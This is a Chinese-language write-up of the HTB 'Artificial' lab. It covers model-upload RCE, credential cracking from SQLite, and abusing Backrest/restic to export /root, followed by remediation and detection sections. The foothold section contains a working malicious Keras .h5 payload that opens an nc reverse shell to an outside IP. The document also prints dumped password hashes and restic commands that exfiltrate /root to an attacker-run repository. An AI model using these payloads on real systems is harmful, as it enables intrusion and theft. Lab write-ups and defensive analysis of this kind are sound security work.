## 0. Meta
- Date: 2025-08-02
- Difficulty: Easy
- Platform: HTB
- Tags: `ai-security/model-file-rce` `web/file-upload` `data/sqlite` `creds/cracking` `privesc/linux` `backup/restic`
- Primary tag (for assets): `ai-security/model-file-rce`
- Time cost: foothold 24h / privesc 10h / writeup 2h
- Audience: internal
- Sanitization: no flag / no real IP / no creds; use `<HTB-IP>` `<LHOST>` `<LPORT>` `<REDACTED>`

## 1. One-line Summary
利用模型文件上传触发服务端加载执行拿到 `app`，从本地数据与配置获取可复用凭据横移到 `gael`，再滥用仅本地开放的备份/恢复能力把 `/root` 的密钥材料导出，最终 root
## 2. Attack Chain
  - Entry: Web 允许上传并加载 .h5 + 提供环境文件下载（Dockerfile）
  - Foothold: 本地构建 PoC → 上传触发 → 初始 shell
  - Lateral: SQLite 拿到 hash → 离线验证/破解 → 复用登录 SSH
  - PrivEsc: 发现本地备份面板线索与地址 → SSH 转发访问 → 通过备份/恢复导出关键材料
  - Root: 恢复得到 SSH 密钥 → root 登录验证
## 3. Walkthrough
### T1 - Recon / Surface
  - Start: `22/80` 开放，HTTP 指向虚拟主机；登录后看到 `.h5` 上传与“触发预测/查看结果”
  - Do: 确认上传文件会被服务端加载执行，而不是仅存储
  - Get: 锁定攻击面：模型文件加载/反序列化链
  - Next: 准备最小 PoC（先证明执行，再做反弹）
  - Evidence (minimal):
```bash
sudo nmap -p- -T4 -sV -sC <HTB-IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-27 17:12 CST
Nmap scan report for 10.10.11.74
Host is up (0.50s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
653/tcp   filtered repscmd
2882/tcp  filtered ndtp
10662/tcp filtered unknown
12492/tcp filtered unknown
17274/tcp filtered unknown
26671/tcp filtered unknown
32437/tcp filtered unknown
41667/tcp filtered unknown
42732/tcp filtered unknown
43443/tcp filtered unknown
57309/tcp filtered unknown
59531/tcp filtered unknown
60869/tcp filtered unknown
65145/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1145.99 seconds
```
### T2 - Foothold（Model upload RCE）

  - Start: 服务端会加载 .h5 并执行预测逻辑
  - Do: 在隔离环境构建恶意 .h5，上传并触发预测
  - Get: app shell
  - Next: 稳定 shell + 找本地数据源（DB/配置/备份/本地监听服务）
  - Evidence (minimal):
  可行poc，但是需要在docker环境中进行构建
```
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.47 6666 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
可行证明
```
nc -lvnp <Lport>
app@artificial:~/app$ ls /home
app  gael
```

### T3 - Local data → Creds
  - Start: app 可读到应用目录/实例数据
  - Do: 定位到 SQLite 用户库，取出 hash 并离线验证/破解（脱敏）
  - Get: 复用凭据 SSH 到 gael
  - Next: 以 gael 信息收集：备份目录、组权限、本地监听端口
  - Evidence (minimal):
```
app@artificial:~/app$ sqlite3 /home/app/app/instance/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> select * from user;
1|gael|gael@artificial.htb|c991759*****224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|user1@email.com|user1@email.com|5f4dcc3b5aa765d61d8327deb882cf99
7|test|test@test.com|098f6bcd4621d373cade4e832627b4f6
8|admin'|admin@admin.com|e10adc3949ba59abbe56e057f20f883e
sqlite>.exit
```
### T4 - 仅本地开放的备份面板
   - Start: gael 下发现备份产物与面板配置线索；服务只监听 127.0.0.1:`<PORT>`
   - Do: 从备份中拿到面板账号材料并验证（脱敏），用 SSH 本地端口转发访问面板
   - Get: 成功登录备份面板
   - Next: 评估功能是否能“导出/恢复 root 相关内容”
   - Evidence (minimal):
这个是找到了备份文件位置并且判断当前用户可以访问这个文件
```
gael@artificial:/var/backups$ ls -al
total 51228
drwxr-xr-x  2 root root       4096 Aug  1 18:55 .
drwxr-xr-x 13 root root       4096 Jun  2 07:38 ..
-rw-r--r--  1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r--  1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r--  1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r--  1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r--  1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r--  1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r--  1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r-----  1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz
gael@artificial:/var/backups$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```
并且信息收集到当前内网有个网站可以访问
```
gael@artificial:/var/backups$ ss -tuln                       
tcp          LISTEN        0              4096                       127.0.0.1:9898                      0.0.0.0:*                       
tcp          LISTEN        0              511                             [::]:80                           [::]:*                       
tcp          LISTEN        0              128                             [::]:22                           [::]:*              
```
端口转发出来
```
ssh gael@<HTB-IP> -L 9898:127.0.0.1:9898
```
### T5 - 滥用备份/恢复导出 root 关键材料 → root
  - Start: 面板支持备份/恢复，并可将快照导出到我可控的位置（或等价能力）
  - Do: 触发备份/导出，把 /root 相关材料导到本地进行恢复（脱敏）
  - Get: 本地恢复拿到 root SSH 密钥材料
  - Next: 用密钥验证 root
  - Evidence (minimal):
```
rest-server --path /tmp/restic-data --listen :12345 --no-auth
restic -r /tmp/restic-data/myrepo snapshots
restic -r /tmp/restic-data/myrepo restore <SNAP> --target ./restore
```
输出/片段：snapshot 路径为 `/root`；`./restore/root/.ssh/` 存在（或等价 root 关键材料）
## 4. Verification & Troubleshooting
### 4.1 模型上传点：到底是“存储”还是“会被加载执行”？
- Symptom: 我一开始不确定 `.h5` 上传后是否真的会触发模型加载/执行，只是“能上传”
- Hypothesis: “View Predictions” 会加载 `.h5` 并执行推理图，属于可执行工件上传（高风险面）
- Test: 上传后触发预测；先做最小证明（能观察到执行痕迹/拿到回连），再完善稳定 shell
- Result: 触发后拿到 `app` shell（有权限证据）
- Next move: 以后遇到“上传 + 预览/解析/预测”，先找触发入口并做最小证明，再做反弹/提权链

### 4.2 初始 shell 不稳定，影响翻库/跑 sqlite
- Symptom: 初步 shell 无 tty，交互差，执行 sqlite/翻文件很难受
- Hypothesis: 需要 PTY 才能稳定做本地枚举与数据库操作
- Test: 上传 `socat` 并反弹 PTY（或等价手段）
- Result: 获得可交互 shell，后续 sqlite/查文件效率提升
- Next move: foothold 后优先“稳定会话”，不要在不稳定 shell 里硬查大文件/跑交互工具

### 4.3 提权线索没抓住：本地监听服务 + `/var/backups`
- Symptom: 我最开始没有把注意力放在“仅本地开放的面板端口”和 `/var/backups` 的备份包
- Hypothesis: 备份/运维面板常是提权关键（配置/凭据/功能滥用），且经常只监听 `127.0.0.1`
- Test: `ss -tuln` 枚举本地监听；检查 `/var/backups` 是否有可读备份包/配置
- Result: 找到本地面板端口 + 可读备份；端口转发后能登录面板并滥用 restic 导出 `/root`
- Next move: 把“本地监听服务 + 备份目录”写进固定枚举 Checklist

## 5. Reusable Checklist（Standard 起步）

### Checklist - ai-security/model-file-rce

**When to use**
- Web 允许上传“后端会加载/解析/执行”的工件（模型/插件/模板/脚本），并存在预览/预测/导入等触发入口

**Steps**
- [ ] 确认触发点：上传后哪一步会触发加载（preview/predict/import）
- [ ] 拿到环境线索：`Dockerfile/requirements`/版本信息，优先用同版本复现生成 PoC
- [ ] 先做最小证明（能观察到执行痕迹/权限证明），再升级成反弹 shell
- [ ] foothold 后先稳定 shell（PTY），再做广泛枚举
- [ ] 优先找本地数据源：SQLite/配置/日志（用户表、token、hash、连接串）
- [ ] 凭据策略：能离线破解就离线；能复用就复用（SSH/su/面板登录）
- [ ] 必查本地监听服务：`ss -tuln`，对 `127.0.0.1:*` 一律考虑 SSH `-L` 转发
- [ ] 必查备份目录：`/var/backups`（或等价路径），重点搜“配置+hash+面板账号材料”
- [ ] 遇到备份/同步工具（Backrest/restic 等）：评估是否可造成“数据外带 / 读取 root 目录”

**Evidence I expect**
- Foothold：`id`/权限证明，或能确认执行发生的证据
- Lateral：能用新凭据登录/切换身份的证据（可脱敏）
- PrivEsc：能证明“本地服务存在 + 转发可访问 + 功能可导出敏感数据”的证据

**Common pitfalls**
- 把上传点当静态文件处理，没去找“触发加载”的入口
- 一上来就做反弹，PoC 调试成本变高（应该先最小证明）
- 忽略 `ss -tuln` 与 `/var/backups` 两条高收益枚举

## 6. Detection Mapping
- Telemetry (where to log):
  - Web/App：`.h5` 上传接口 + 触发预测/加载接口（记录 user、文件名/大小、耗时、状态码）
  - Host/EDR：推理/加载进程的子进程树、异常文件写入、异常出站连接（尤其是 `sh/nc/python` 之类）
  - Auth：SSH 登录成功/失败、同一账户在异常时间段登录
  - Backup：Backrest/restic 任务创建与执行日志、repo 目标变更、备份路径（尤其是 `/root`）
- High-signal alerts:
  - `.h5` 上传后短时间内触发预测接口，并伴随异常子进程/外联
  - 非预期的备份行为：外联到未知 repo，或出现备份 `/root` 的任务
- Low-noise correlation (optional):
  - “模型上传/预测”事件 + “出站连接/备份外联”在短时间窗口内同时出现

## 7. Notes
- What I learned:
  - “可被后端加载的上传工件”本质上更像反序列化/可执行工件上传，不要按静态文件处理
  - 低权拿 shell 后，`SQLite/本地监听服务/备份目录` 往往比“跑更多扫描器”更高收益
- What I’d do faster next time:
  - 先最小证明再反弹，减少 PoC 调试成本
  - foothold 后先稳定会话，再做 sqlite/备份/端口转发与功能滥用评估

---

## 8. Asset Extraction

### 8.1 Checklist 
- Title: `ai-security/model-file-rce`（模型/工件上传触发加载 → 执行）
- Steps (5-12 bullets):
  - 确认上传后是否存在 preview/predict/import 触发加载入口
  - 拿到版本与依赖（Dockerfile/requirements），同版本复现 PoC
  - 先做最小证明（权限/文件落地），再做反弹
  - foothold 后先稳定 shell（PTY）
  - 查 SQLite/配置/日志提取凭据与 token
  - 查 `ss -tuln`，对 `127.0.0.1:*` 做端口转发验证
  - 查 `/var/backups` 等备份目录，优先找配置与账号材料
  - 评估备份工具是否可用于数据外带（尤其 `/root`）
- Common pitfalls:
  - 一上来就反弹导致调试困难；忽略本地监听服务与备份目录

### 8.2 Fix & Retest 
- Root cause (1-2 lines):
  - 服务端将用户可控的模型工件当作可信输入加载执行；同时备份面板可被低权限链路间接控制导致敏感数据被导出。
- Minimal fix (1-3 bullets):
  - 禁止直接加载用户上传的可执行工件；改为离线审批/签名校验/白名单格式（或仅允许安全中间表示）
  - 推理/解析放入隔离沙箱：最小权限、只读文件系统、无出网（或严格 egress allowlist）
  - 备份面板最小权限与强认证：限制可备份路径，禁止备份 `/root`，并记录/告警 repo 变更
- Retest criteria (3-6 checks):
  - [ ] 上传恶意 `.h5` 无法触发命令执行/文件落地
  - [ ] 推理容器无出网/无敏感挂载，越权访问被阻断
  - [ ] 备份系统无法将 `/root` 备份到外部未知 repo
  - [ ] 关键行为（上传/预测/备份 repo 变更）均有日志与告警

### 8.3 Detection 
- Telemetry points (where to log):
  - Web/App：上传与触发预测接口日志（含文件元信息、耗时、状态码）
  - Host/EDR：模型加载进程的子进程树、异常写文件、异常出站连接
  - Backup：任务创建/执行、repo 变更、备份路径（重点 `/root`）
- High-signal alerts:
  - `.h5` 上传 + 预测触发后出现异常子进程/外联
  - 备份 repo 变更到未知地址，或备份路径包含 `/root`
- Low-noise correlation idea (optional):
  - “上传/预测”事件与“外联/备份外传”在短时间窗口内关联
